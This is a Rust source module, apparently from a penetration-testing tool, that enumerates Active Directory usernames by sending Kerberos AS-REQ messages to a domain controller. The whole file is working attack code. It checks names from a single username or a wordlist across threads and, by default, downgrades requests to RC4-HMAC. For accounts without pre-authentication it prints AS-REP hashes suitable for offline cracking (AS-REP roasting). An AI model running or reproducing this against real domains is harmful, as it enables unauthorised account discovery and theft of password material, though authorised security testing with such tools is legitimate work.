use std::{
    fs::File, io::{BufRead, BufReader},
    net::ToSocketAddrs,
    process
};
use krb5rs::{
    asn1::{
        structures::*,
        constants::*
    },
    network::Kdc,
};
use rayon::ThreadPoolBuilder;
use colored::*;
use crate::arguments::UserenumArgs;
use crate::helpers::*;

pub fn start(args: UserenumArgs) {
    // Create SocketAddr from args.ip or try to resolve args.domain.
    let sock_addr = if args.ip.is_some() {
        (args.ip.unwrap(), 88u16).to_socket_addrs()
        .unwrap()
        .next()
        .unwrap()
    } else {
        try_resolve(&args.domain)
    };

    // Create KDC object
    let dc = Kdc::new(sock_addr, args.domain);

    // Run if args.username.username is supplied.
    if args.username.username.is_some() {
        check_user(&dc, args.username.username.unwrap(), args.npauth, args.opsec);
    }

    // Run if args.username.userlist is supplied.
    if args.username.userlist.is_some() {
        let file = File::open(args.username.userlist.unwrap())
            .unwrap_or_else(|e| {
                println!("{M}Cannot read file: {}", e);
                process::exit(0);
            });
        let reader = BufReader::new(file);
        start_thread(&dc, reader, args.threads, args.npauth, args.opsec);
    }
}

fn start_thread(dc: &Kdc, reader: BufReader<File>, threads: usize, npauth: bool, opsec: bool) {
    // Build threadpool with supplied thread
    // By default, thread is 2.
    let pool = ThreadPoolBuilder::new()
        .num_threads(threads)
        .build()
        .unwrap_or_else(|e| {
            println!("Unable to build threadpool: {}", e);
            process::exit(0);
        });

    // Execute thread "pool"
    pool.install(|| {
        rayon::scope(|s| {
            // check frist user as blocking, and subseqent users as threaded.
            for (i, username) in reader.lines().enumerate() {
                if i == 0 {
                    check_user(dc, username.unwrap(), npauth, opsec);
                } else {
                    s.spawn(|_| {
                        check_user(dc, username.unwrap(), npauth, opsec);
                    })
                }
            }
        })
    })
}

fn check_user(dc: &Kdc, username: String, npauth: bool, opsec: bool) {
    // create AS-REQ structure, with username
    let mut asreq = AsReq::build(
        KerberosString::from_bytes(username.as_bytes()).unwrap(),
        Realm::from_bytes(dc.realm.as_bytes()).unwrap(),
        None
    );

    // if opsec is false, try to netogiate RC4-HMAC
    // opsec is false by default
    // remove RC4 etype from the end of the vector and prepend it at the beginning of KDC-REQ-BODY.etype
    if !opsec {
        asreq.0.req_body.etype.pop();
        asreq.0.req_body.etype.insert(0, encryption::rc4_hmac as i32);
    }

    match asreq.send_and_parse(dc) {
        // AS-REP recieved only when pre-auth is disabled.
        Ok(asrep) => {
            println!("{P}Valid User: {} - No pre-auth required!", username.green());
            if npauth {
                println!("AS-REP hash for user: {username}");
                println!("{}", asrep_to_hash(asrep).green())
            }
        },
        Err(resp_error) => {
            let krberror = getkrberror(resp_error);
            let err_code = krberror.error_code;
            let error = krberror.geterrorvalue()
                .unwrap();
            if err_code == krberrors::KDC_ERR_WRONG_REALM {
                println!("{M}Wrong Domain! Exiting!");
                process::exit(0);
            }
            let valiusererrorcodes = [
                krberrors::KDC_ERR_PREAUTH_REQUIRED,
            ];
            if valiusererrorcodes.contains(&err_code) {
                println!("{P}Valid User: {} - [{}]", username.green(), error);
            }
        }
    }
}
